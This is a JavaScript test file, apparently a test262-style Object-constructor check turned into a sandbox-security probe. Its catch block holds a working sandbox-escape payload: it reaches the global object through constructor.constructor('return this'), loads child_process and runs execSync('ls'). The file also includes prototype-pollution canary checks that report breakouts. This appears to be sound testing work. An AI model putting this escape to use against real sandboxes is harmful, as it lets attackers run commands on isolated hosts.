try {
    if (typeof func !== 'undefined') {
        $ERROR('#0: function expression can\'t be declarated');
    }
    var n_obj = new Object(function func() {
        throw () => {
            return () => {
            };
        };
        return 1;
    });
    if (n_obj.constructor !== Function) {
        $ERROR('#1: When the Object constructor is called and if the value is an Object simply value returns');
    }
    if (n_obj() !== 1) {
        $ERROR('#2: When the Object constructor is called and if the value is an Object simply value returns');
    }
    if (typeof func !== 'undefined') {
        $ERROR('#3: function expression can\'t be declarated');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}